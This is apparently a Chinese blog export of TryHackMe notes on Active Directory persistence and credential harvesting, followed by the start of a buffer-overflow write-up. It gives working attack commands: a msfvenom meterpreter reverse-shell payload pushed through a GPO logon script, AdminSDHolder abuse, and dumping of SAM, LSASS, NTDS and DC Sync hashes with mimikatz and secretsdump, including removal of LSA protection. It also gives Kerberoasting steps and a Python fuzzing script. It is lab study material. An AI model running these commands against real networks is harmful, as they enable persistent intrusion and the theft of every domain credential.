RDP 进入 THMWRK1，使用 runas 命令注入管理员凭据，然后从这个新终端执行 MMC： 1runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe add the Users and Groups Snap-in (File-&gt;Add Snap-In-&gt;Active Directory Users and Computers). Make sure to enable Advanced Features (View-&gt;Advanced Features 要选中那个域名才会出现). 找到 AdminSDHolder 组 右键 -&gt; 属性 -&gt; 安全，把我们的低权限账户加进去，然后授予完全控制权限。 SDProp现在我们只需等待 60 分钟，用户就可以完全控制所有受保护组了。这是因为安全描述符传播器（SDProp）服务每 60 分钟自动执行一次，并将此更改传播到所有受保护组。在 C:\\Tools\\ 目录中（我没找到，手动传的），提供了一个脚本 Invoke-ADSDPropagation，他可以让这个行为立即执行。 12Import-Module .\\Invoke-ADSDPropagation.ps1 Invoke-ADSDPropagation 执行之后马上就能看到这个用户被加上权限了，可以自己试验把他删了，然后手动执行一下脚本他又回来了。不过我们用户不会在这个组里面，只是有这个组的编辑权限，还要手动加进去。 对蓝队来说简直是雪上加霜想象一下，把这种技术和之前讨论过的“嵌套组”结合起来。当蓝队刚通过无数次修改组权限来清除你的访问时，60 分钟后，你又可以重新来过。除非蓝队知道权限正在通过 AdminSDHolder 组被更改，否则他们会每隔一小时就感到困惑不解。由于这种持久化是通过一个合法的 AD 服务传播的，他们很可能每次都无法察觉。如果你真的想实现长久持久化，你可以在 AdminSDHolder 组中授予 Domain Users 组完全控制权限，这意味着任何低权限用户都将获得对所有受保护组的完全控制。再结合一次完整的 DC Sync 攻击，蓝队将不得不重置域中每个账户的凭据，才能将我们彻底清除。 Persistence through GPOs这一节则是用组策略对象 GPO 去内置一些启动脚本达成持久化。 域范围持久化以下是一些常见的 GPO 持久化技术： 受限组（Restricted Group）成员资格：这可以让我们获得域中所有主机的管理员访问权限。 登录脚本部署：这能确保每当有用户认证登录到域中的主机时，我们都能获得一个反向 Shell 连接。 准备12# 生成小马 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe &gt; recopec_shell.exe Windows 允许我们通过登录 GPO 执行批处理或 PowerShell 脚本。批处理脚本通常比 PowerShell 脚本更稳定，因此让我们创建一个脚本，将可执行文件复制到主机，并在用户验证后执行。 1copy \\\\za.tryhackme.loc\\sysvol\\za.tryhackme.loc\\scripts\\recopec_shell.exe C:\\tmp\\recopec_shell.exe &amp;&amp; timeout /t 20 &amp;&amp; C:\\tmp\\recopec_shell.exe 123456# 复制文件到 sysvol 目录下 scp recopec_shell.exe za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ scp recopec_script za\\\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/ # 启动 MSF 监听器 msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit&quot; 创建 GPO照例用 Runas 注入凭据，然后添加 Group Policy Management 组件。 1runas /netonly /user:thmchilddc.tryhackme.loc\\Administrator cmd.exe 从技术上讲，我们可以将内容写入 “默认域策略”，该策略应传播到所有 AD 对象，但我们将采用更狭义的方法来完成任务，只是为了展示过程。之后，您可以尝试将更改应用到整个域。 我们将编写一个应用于所有管理员的 GPO，因此右键单击 Admins OU 并选择在此域中创建一个 GPO，然后将其链接到此处。 貌似被修复了：https://support.microsoft.com/en-us/topic/ms15-011-vulnerability-in-group-policy-could-allow-remote-code-execution-february-10-2015-91b4bda2-945d-455b-ebbb-01d1ec191328 后面的走不下去了。 总结我们有几种不同的方法在 AD 中维持权限。其中一些方法的持久性比其他方法更好。为了确保您的持久性不会被蓝队删除，您必须创造性地考虑您的持久性。此外，你不应该等到整个域攻陷后才部署持久性。在每一轮横向移动和权限升级之后，都应部署持久性。 其他持久化技术在本网络中，我们介绍了可用于在 AD 中持久化的几种技术，以下是同样值得一提的持久化技术： Skeleton keys - 使用 Mimikatz，我们可以部署一把“万能钥匙”。Mimikatz 会创建一个默认密码，这个密码对域内的任何账户都有效。同时，账户的原始密码仍然可用，这使得很难察觉到该攻击的发生。利用这把万能钥匙，攻击者可以冒充域内的任何账户。 Directory Service Restore Mode (DSRM) - 域控制器有一个用于紧急情况的内置管理员账户，称为 DSRM 账户。这个密码在服务器被提升为域控制器时设置，并且很少更改。在紧急情况下，这个密码可以用来恢复域控制器。攻击者可以使用 Mimikatz 提取这个密码，并利用它获得对环境中域控制器的持久化管理员权限。 Malicious Security Support Provider (SSP) - 通过利用 SSP 接口，可以添加新的 SSP。我们可以将 Mimikatz 的 mimilib 添加为一个 SSP，它会把所有认证尝试的凭据记录到一个文件中。我们可以指定一个网络位置来记录，这使得 mimilib 可以在用户认证到被入侵主机时将凭据发送给我们，从而实现持久化。 Computer Accounts - 计算机账户的密码通常每 30 天自动轮换一次。然而，我们可以修改一个计算机账户的密码，从而阻止这种自动轮换。与此同时，我们还可以授予该计算机账户对其他机器的管理员访问权限。这将使我们能够像使用普通账户一样使用这个计算机账户，而这种持久化的唯一迹象就是该账户对其他主机拥有管理员权限，这在 AD 中通常是正常行为，因此可能不会被检测到。 防御措施防御 AD 持久化可能非常棘手。在某些情况下，持久化的根源可能深到需要完全重建整个域。然而，我们仍然可以采取一些措施来检测已部署的持久化技术： 异常账户登录事件：这是最常见的持久化告警。任何时候，当凭据违反了分层模型时，都可能意味着存在持久化。 编写特定检测规则：针对每一种提到的持久化技术，都可以编写特定的检测规则。例如，当机器账户的密码发生更改时、ACL 权限被随意更新时，或有新的 GPO 被创建时。 保护特权资源：对抗持久化的最佳防御是保护特权资源。尽管低权限访问可以用来部署一些持久化技术，但那些真正可怕的技术只有在攻击者获得域的特权访问后才可用。 Credentials Harvesting这个房间讲的就是一些凭证收集的技巧了，应该记录在速查里面的 直接访问的凭据 命令历史 配置文件（Web App, FTP 文件等） 备份文件 共享文件和文件夹 注册表 源码 数据库 密码管理器 12345678910# PowerShell 命令历史 type C:\\Users\\Recopec\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt # 注册表搜索密码关键字 reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s # Active Directory # 获取域内用户用户名 SamAccountName 和描述 Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description Windows 本地凭据方法1：键盘记录器，MSF 自带 SAM 文件SAM 是一个 Microsoft Windows 数据库，其中包含用户名和密码等本地账户信息。SAM 数据库以加密格式存储这些详细信息，使其更难被检索。此外，在 Windows 操作系统运行时，任何用户都无法读取和访问该数据库。不过，有多种方法和攻击方式可以转储 SAM 数据库的内容。 不能读取 SAM 文件的解决办法因为权限或者其他问题导致没法直接把 sam 文件读取出来。 MSF这个就不用说了把，直接 hashdump 就出来了。 Volume Shadow Copy Service这个像是打一个快照一样，然后去访问这个快照，就绕过了访问限制，这里我们用 wmic 完成这个操作，注意需要管理员权限。 123456789101112# 给 C 盘创建一个 shadowcopy wmic shadowcopy call create Volume=&#39;C:\\&#39; # vssadmin: Volume Shadow Copy Service administrative command-line tool # 查看 shadowcopy 列表 vssadmin list shadows # Shadow Copy Volume: 即我们要找的目录 # 复制我们要的文件 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\sam C:\\users\\thm\\Desktop\\sam # 复制解密密钥 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\system C:\\users\\thm\\Desktop\\system SAM 数据库是被 RC4 或者 AES 加密的，我们需要一个解密密钥，在 c:\\Windows\\System32\\Config\\system 下。 Registry Hives另一种转储 SAM 数据库内容的方法是通过 Windows 注册表。Windows 注册表还存储了部分 SAM 数据库内容的副本，供 Windows 服务使用。幸运的是，我们可以使用 reg.exe 工具保存 Windows 注册表的值。 123456# 导出这两个文件 reg save HKLM\\sam C:\\users\\thm\\Desktop\\sam-reg reg save HKLM\\system C:\\users\\thm\\Desktop\\system-reg # 解密 python secretsdump.py -sam /home/kali/thm/sam-reg -system /home/kali/thm/system-reg local 请注意，如果我们将输出结果与从 Metasploit 的 Hashdump 中获得的 NTLM 哈希值进行比较，结果是不同的。原因是其他账户属于 AD，它们的信息没有存储在我们转储的系统文件中。要解密它们，我们需要转储 Windows 文件中的 SECURITY 文件，其中包含解密 Active Directory 账户所需的文件。获得 NTLM 哈希值后，如果可以猜到，我们可以尝试使用 Hashcat 对其进行破解，或者使用不同的技术使用哈希值冒充用户。 本地安全管理子系统服务什么是 LSASS本地安全授权服务器服务（LSASS）是一个 Windows 进程，负责处理操作系统安全策略并在系统中执行。它验证登录账户并确保密码、哈希值和 Kerberos 票据。Windows 系统将凭证存储在 LSASS 进程中，以便用户访问网络资源，如文件共享、SharePoint 网站和其他网络服务，而无需在每次连接时输入凭证。因此，LSASS 进程是红队人员的目标，因为它存储了用户账户的敏感信息。LSASS 通常会被滥用来转储凭证，以提升权限、窃取数据或横向移动。幸运的是，如果我们拥有管理员权限，就可以转储 LSASS 的进程内存。Windows 系统允许我们创建转储文件，即给定进程的快照。这可以通过桌面访问（图形用户界面）或命令提示符完成。这种攻击在 MITRE ATT&amp;CK 框架中被定义为 “OS Credential Dumping: LSASS Memory (T1003)“。 转储 LSASS首先是不借助工具的情况。直接任务管理器 -&gt; 右键创建 dump 文件。 12345678# 用 SysinternalsSuite DUMP lsass c:\\Tools\\SysinternalsSuite\\procdump.exe -accepteula -ma lsass.exe c:\\Tools\\Mimikatz\\lsass_dump # 用 mimikatz dump mimikatz.exe privilege:debug sekurlsa::logonpasswords #ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) 受害者必须登录进系统里，这个用户的凭证才会被缓存。 保护的 LSASS2012 年，微软实施了 LSA 保护措施，以防止访问 LSASS 从内存中提取凭证。 要启用 LSASS 保护，我们可以将 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa 中的注册表 RunAsPPL DWORD 值修改为 1。 12345678# 如果你是跟着 Room 走的，上面的命令会报错，你需要执行下面的命令 # 打开到工具目录 cd c:\\Tools\\Mimikatz ./mimikatz.exe # 关闭 LSA 保护 !+ !processprotect /process:lsass.exe /remove # 现在你就可以再跑一遍上面的步骤了 Windows 凭据管理器什么是凭证管理器？凭证管理器是 Windows 的一项功能，用于存储网站、应用程序和网络的登录敏感信息。它包含用户名、密码和互联网地址等登录凭据。有四个凭证类别： 网络凭证包含存储在互联网浏览器或其他应用程序中的身份验证详细信息。 Windows 凭据包含 Windows 身份验证详细信息，如 NTLM 或 Kerberos。 通用凭证包含基本身份验证详细信息，如明文用户名和密码。 基于证书的凭证： 这些是基于证书的身份验证详细信息。 访问凭据管理器可以直接在 GUI 上查看 (Control Panel -&gt; User Accounts -&gt; Credential Manager) ，或者使用 Microsoft Credentials Manager vaultcmd 工具。 123456# 显示系统里可用的的保险库 vaultcmd /list # 检查保险库里面存储的内容 VaultCmd /listproperties:&quot;Web Credentials&quot; # 列出凭据存储的更多信息 VaultCmd /listcreds:&quot;Web Credentials&quot; 转储凭据VaultCmd 无法显示密码，但我们可以依靠其他 PowerShell 脚本，如 Get-WebCredentials.ps1，它已包含在所附的虚拟机中，执行脚本时要带上 bypass 命令。 Bypass policy 指的是 PowerShell 的执行策略（Execution Policy）。 这是 PowerShell 的一项安全功能，旨在防止恶意脚本在未经用户许可的情况下运行。它有以下几种模式： Restricted：最严格的模式，不允许任何脚本运行。 AllSigned：只允许运行由可信发布者签名的脚本。 RemoteSigned：允许运行自己创建的本地脚本，但要求从网上下载的脚本必须经过签名。 Bypass：最宽松的模式，绕过所有执行策略，允许任何脚本运行，没有警告或提示。 12345powershell -ex bypass # 载入模块 Import-Module C:\\Tools\\Get-WebCredentials.ps1 # 导出 Web 凭证 Get-WebCredentials RunAs可以使用保存的凭据运行 RunAs 载入凭据 1234567# 查看保存的凭据 cmdkey /list # 使用 thm.red\\thm-local 凭据运行 cmd runas /savecred /user:thm.red\\thm-local cmd.exe type &quot;c:\\Users\\thm-local\\Saved Games\\flag.txt&quot; Mimikatz 提取密码用这个就可以直接提取明文密码了 123456c:\\Tools\\Mimikatz\\mimikatz.exe privilege::debug # 如果报错就用解锁 LSASS 方法跑一遍 # 导出凭据 sekurlsa::credman 域控这一节就讲了如何本地和远程提取域控的 Hash。 NTDS Domain Controller新技术目录服务 (NTDS) 是一个包含所有 Active Directory 数据（包括对象、属性、凭证等）的数据库。NTDS.DTS 数据由以下三个表组成： Schema table: it contains types of objects and their relationships. Link table: it contains the object’s attributes and their values. Data type: It contains users and groups. NTDS 默认位于 C:\\Windows\\NTDS，并已加密，以防止从目标计算机提取数据。从运行的机器访问 NTDS.dit 文件是不允许的，因为该文件被 Active Directory 使用并锁定。不过，有多种方法可以访问该文件。本任务将讨论如何使用 ntdsutil 和 Diskshadow 工具获取 NTDS 文件的副本，最后讨论如何转储文件内容。需要注意的是，解密 NTDS 文件需要使用系统引导密钥来尝试解密 LSA 隔离凭据，该凭据存储在 SECURITY 文件系统中。因此，我们还必须转储包含所有解密所需文件的安全文件。 NtdsutilNtdsutil 是一款 Windows 实用程序，用于管理和维护 Active Directory 配置。它可用于各种情况，如 恢复 Active Directory 中已删除的对象。 执行 AD 数据库维护 活动目录快照管理。 设置目录服务还原模式 (DSRM) 管理员密码。 参考 Microsoft documentation。 本地 Dump（无凭证）如果您没有可用的凭证，但有域控制器的管理员访问权限，通常会这样做。因此，我们将依靠 Windows 实用程序来转储 NTDS 文件并离线破解它们。首先，我们假设自己拥有域控制器的管理员权限。要成功转储 NTDS 文件的内容，我们需要以下文件： C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY 下面是一条单行 PowerShell 命令，使用 Ntdsutil 工具转储 C:\\temp 目录中的 NTDS 文件。 12345# 本地导出 NTDS powershell &quot;ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full c:\\temp&#39; q q&quot; # 把文件传到自己的机器上运行 impacket 脚本 python secretsdump.py -security /home/kali/thm/20250808/SECURITY -system /home/kali/thm/20250808/SYSTEM -ntds /home/kali/thm/20250808/ntds.dit local 远程 Dump（有凭证）在上一节中，我们讨论了如何在没有凭证的情况下从内存中获取哈希值。在本任务中，我们将演示如何远程转储系统和域控制器哈希值，这需要密码或 NTLM 哈希值等凭证。我们还需要具有域控制器管理访问权限或特殊权限的用户的凭据。 DC SyncDC Sync 是在 Active Directory 环境中执行的一种流行攻击，用于远程转储凭据。当具有以下 AD 权限的账户（具有必要权限的特殊账户）或 AD 管理账户受到攻击时，这种攻击就会起作用： Replicating Directory Changes Replicating Directory Changes All Replicating Directory Changes in Filtered Set 攻击者会利用这些配置来执行域复制，通常称为 “DC Sync ”或 “域控制器同步”。 可以用 mimikatz 工具执行 DC Sync 攻击，不过这里用 Impacket SecretsDump 远程实现。 123456# 远程导出 NTDS 他还会导出 Kerberos 密钥 python secretsdump.py -just-dc THM.red/thm@10.201.48.121 # 会提示你输入密码 # 远程导出 NTLM python secretsdump.py -just-dc-ntlm THM.red/thm@10.201.48.121 Local Administrator Password Solution (LAPS)组策略首选项（Group Policy Preferences, GPP）Windows 操作系统有一个内置的管理员账户，可以通过密码访问。在拥有大量计算机的 Windows 环境中更改密码是一项挑战。因此，微软实现了一种方法，允许管理员使用组策略首选项（GPP）在所有工作站上更改本地管理员账户。 GPP 是一种工具，允许管理员创建包含嵌入式凭据的域策略。一旦部署了 GPP，SYSVOL 文件夹中会创建不同的 XML 文件。SYSVOL 是 Active Directory 的一个关键组件，它在 NTFS 卷上创建一个共享目录，所有经过身份验证的域用户都可以以读取权限访问。 问题在于，这些与 GPP 相关的 XML 文件中包含一个使用 AES-256 位加密的密码。在当时，这种加密强度被认为是足够的，直到微软不知何故在其 MSDN 网站上发布了私钥。由于域用户可以读取 SYSVOL 文件夹的内容，因此解密存储的密码变得轻而易举。用于破解 SYSVOL 加密密码的工具之一就是 Get-GPPPassword。 Local Administrator Password Solution (LAPS)2015 年，微软不再将加密密码存储在 SYSVOL 文件夹中。他们引入了 本地管理员密码解决方案（LAPS），这是一种更安全的远程管理本地管理员密码的方法。 这种新方法在 Active Directory 的计算机对象中添加了两个新的属性：ms-mcs-AdmPwd 和 ms-mcs-AdmPwdExpirationTime。ms-mcs-AdmPwd 属性包含本地管理员的明文密码，而 ms-mcs-AdmPwdExpirationTime 则包含密码的重置过期时间。LAPS 使用 admpwd.dll 来更改本地管理员密码并更新 ms-mcs-AdmPwd 的值。 12345678910111213141516# 检查 LAPS 是否开启 dir &quot;C:\\Program Files\\LAPS\\CSE&quot; # 检查是否有对 AdmPwd 可用的 cmdlets Get-Command *AdmPwd* CommandType Name ----------- ---- Cmdlet Find-AdmPwdExtendedRights Cmdlet Get-AdmPwdPassword Cmdlet Reset-AdmPwdPassword Cmdlet Set-AdmPwdAuditing Cmdlet Set-AdmPwdComputerSelfPermission Cmdlet Set-AdmPwdReadPasswordPermission Cmdlet Set-AdmPwdResetPasswordPermission Cmdlet Update-AdmPwdADSchema 可以使用 -Identity * 参数列出所有可用的 OU。 12345678910111213141516# 找哪个 AD OU 拥有处理 LAPS 的 “所有扩展权限 ”属性 Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} # 检查组 net groups &quot;LAPsReader&quot; Members ------------------------------------------------------------------------------- bk-admin # 获取 bk-admin 用户权限后，可以用下面这个命令获取 LAPS 密码 Get-AdmPwdPassword -ComputerName creds-harvestin 需要注意的是，在实际的 AD 环境中，LAPS 只在特定的计算机上启用。因此，您需要枚举并找到正确的目标计算机以及正确的用户账户，才能获取 LAPS 密码。有很多脚本可以帮助实现这一点，但我们在 C:\\Tool 中包含了 LAPSToolkit PowerShell 脚本，可以试用一下。 其他攻击方式KerberoastingKerberoasting 是一种常见的 AD 攻击，用于获取有助于持久性的 AD 票据。要使这种攻击奏效，攻击者必须能访问 SPN（服务主名）账户，如 IIS User、MSSQL 等。Kerberoasting 攻击涉及请求 Ticket Granting Ticket (TGT) 和 Ticket Granting Service (TGS)。这种攻击的最终目的是实现权限升级和横向网络移动。让我们快速演示一下该攻击。首先，我们需要找到 SPN 账户，然后发送请求以获取 TGS 票据。我们将使用 GetUserSPNs.python 脚本从 AttackBox 执行 Kerberoasting 攻击。 12345678# SPN 枚举 python GetUserSPNs.py -dc-ip 10.201.48.121 THM.red/thm # 请求 TGS 票据 python GetUserSPNs.py -dc-ip 10.201.80.121 THM.red/thm -request-user svc-thm # 爆破 TGS hashcat hash.txt rockyou.txt AS-REP RoastingAS-REP Roasting 是一种使攻击者能够检索账户选项设置为“不需要 Kerberos 预验证“的 AD 用户密码哈希值的技术。 该选项依赖于旧的 Kerberos 身份验证协议，该协议允许在没有密码的情况下进行身份验证。 获得哈希值后，我们可以尝试离线破解，最后，如果可以破解，我们就得到了密码！ 1python GetNPUsers.py -dc-ip 10.201.80.121 thm.red/ -usersfile /tmp/users.txt 还有一些玩过的： SMB 中继 LLMNR &#x2F; NBNS 投毒 总结其实主要就那几个方向，收集用户机器上的密码，比如说密码管理器，浏览器，转储 LSASS。之后呢，拿到了权限可以用 dcsync 拿下金票，那些 LAPS 不太懂，估计碰不上。 可以尝试使用以下工具来扫描目标机器。 Snaffler Seatbelt Lazagne","categories":[{"name":"THM","slug":"THM","permalink":"https://blog.irec.moe/categories/THM/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.irec.moe/tags/Windows/"},{"name":"Active Directory","slug":"Active-Directory","permalink":"https://blog.irec.moe/tags/Active-Directory/"}]},{"title":"Try Hack Me - Buffer Overflow Prep","slug":"THM/20250708_Buffer_Overflow_Prep/Buffer_Overflow_Prep","date":"2025-07-07T16:00:00.000Z","updated":"2025-07-07T17:54:35.285Z","comments":true,"path":"/thm_bufferoverflow.html","permalink":"https://blog.irec.moe/thm_bufferoverflow.html","excerpt":"","text":"Room：https://tryhackme.com/room/bufferoverflowprep 首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。 背景知识EIPEIP 是 x86 架构（32 位）CPU 中的一个特殊寄存器。它非常重要，因为它存储着 CPU 下一条要执行的指令的内存地址。 Immunity Debugger是调试器，类似 OllyDbg x64dbg &#x2F; x32dbg 这种软件，分析调试软件用的。 MonaMona 是一个功能强大的 Python 脚本，专门设计用于扩展和增强 Immunity Debugger 或 WinDbg 这类调试器的功能。它在漏洞利用（Exploit Development）和逆向工程（Reverse Engineering）领域非常受欢迎，特别是用于自动化许多在缓冲区溢出（Buffer Overflow）漏洞利用过程中繁琐且耗时的任务。 模式字符串（Pattern String）是在缓冲区溢出漏洞利用中用于精确计算 EIP（指令指针）偏移量的一种特殊字符串。它由一系列唯一且按特定算法生成的字符或字节组成，其独特性在于字符串中的任何一个固定长度的片段都只会在整个字符串的唯一一个位置出现。当你将足够长的模式字符串作为输入发送给易受攻击的程序，并导致其崩溃时，被模式字符串片段覆盖的 EIP 寄存器值就如同一个“指纹”或“线索”。通过工具（如 Metasploit 的 pattern_offset.rb 或 Mona 的 findmsp 命令）反向查找这个“指纹”在原始模式字符串中的位置，你就能精确地确定从输入起始点到 EIP 的字节偏移量，从而知道需要填充多少垃圾数据才能精准控制程序执行流。 字节序（Endianness）字节序指的是多字节数据（例如一个 32 位整数或一个内存地址）在计算机内存中存储的字节顺序。主要有两种类型： **大端序 (Big-Endian)**： 最高有效字节 (Most Significant Byte, MSB) 存储在最低内存地址。 就像我们写数字一样：0x12345678 会被存储为 12 34 56 78。 **小端序 (Little-Endian)**： 最低有效字节 (Least Significant Byte, LSB) 存储在最低内存地址。 0x12345678 会被存储为 78 56 34 12。 坏字符（Bad Characters）在缓冲区溢出漏洞利用中，你的目标是将一段特定的字节序列（通常是 Shellcode 和返回地址）写入到程序的内存中。然而，程序在处理输入时，可能会使用一些字符串操作函数（例如 C 语言中的 strcpy()、strcat()、sprintf() 等）。 这些函数有特定的行为： 空字节 (\\x00)： 这是最常见的坏字符。许多字符串函数会将 \\x00 解释为字符串的结束符。如果你的 Shellcode 中包含 \\x00，那么当这些函数复制你的 Payload 时，它们会在遇到第一个 \\x00 时就停止复制，导致 \\x00 后面的 Shellcode 部分被截断，无法完整写入内存，从而执行失败。 其他特殊字符： 除了 \\x00，某些应用程序或协议可能还会对其他特定字节值进行特殊处理。例如： 回车 (\\x0d) 和换行 (\\x0a)： 在某些基于行的输入协议中，这些字符可能被视为行的结束符，导致你的 Payload 被截断。 空 ASCII 字符 (\\x20，空格)： 有些协议可能不允许在特定位置出现空格。 其他 ASCII 控制字符或编码问题： 有些应用程序在处理某些字节值时可能会将其误认为是控制字符，导致数据被修改或丢弃。 连接机器这里我试了好久，网上关于 xfreerdp3 的教程基本上没有。实际上这个软件体验很差，我最后用 socat 映射 3389 给本机，用 mstsc 。 1xfreerdp3 /u:admin /p:password /cert:ignore /sec:rdp /tls:enforce:1.0 /v:10.10.3.91 打开 Immunity Debugger 执行这个命令，设置 mona 的工作文件夹。 1!mona config -set workingfolder c:\\mona\\%p 然后让我们用 nc 连一下服务器，是一个交互程序，好像是让我测试不同的入口会发生什么不一样的错误这样。 找崩溃区间生成了一个一直增加发送字符的脚本，步进是 100bytes 1234567891011121314151617181920212223242526#!/usr/bin/env python3 import socket, time, sys ip = &quot;10.10.3.91&quot; port = 1337 timeout = 5 prefix = &quot;OVERFLOW1 &quot; string = prefix + &quot;A&quot; * 100 while True: try: with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(timeout) s.connect((ip, port)) s.recv(1024) print(&quot;Fuzzing with {} bytes&quot;.format(len(string) - len(prefix))) s.send(bytes(string, &quot;latin-1&quot;)) s.recv(1024) except: print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix))) sys.exit(0) string += 100 * &quot;A&quot; time.sleep(1) 2000bytes 崩溃。 崩溃复现和控制 EIP12# 生成一个超过崩溃阈值 400bytes 的文本 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400 这是让我们找那个崩溃的临界点，加400字节我猜是增加一点容错。替换到代码中的 payload 部分。 123456789101112131415161718192021222324import socket ip = &quot;10.10.3.91&quot; port = 1337 prefix = &quot;OVERFLOW1 &quot; offset = 0 overflow = &quot;A&quot; * offset retn = &quot;&quot; padding = &quot;&quot; payload = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9C